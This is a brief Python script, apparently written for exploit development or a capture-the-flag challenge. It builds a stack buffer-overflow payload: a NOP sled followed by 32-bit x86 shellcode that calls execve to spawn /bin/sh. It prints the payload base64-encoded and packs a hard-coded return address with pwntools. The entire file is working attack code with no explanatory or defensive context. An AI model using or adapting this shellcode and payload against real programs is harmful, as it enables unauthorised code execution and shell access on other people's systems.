import base64
import pwn

shellcode = b'\x90' * 31 + bytes.fromhex('6a68682f2f2f73682f62696e89e368010101018134247269010131c9516a045901e15189e131d26a0b58cd80')

print(base64.b64encode(shellcode))
print(pwn.p32(0xbffffe18))
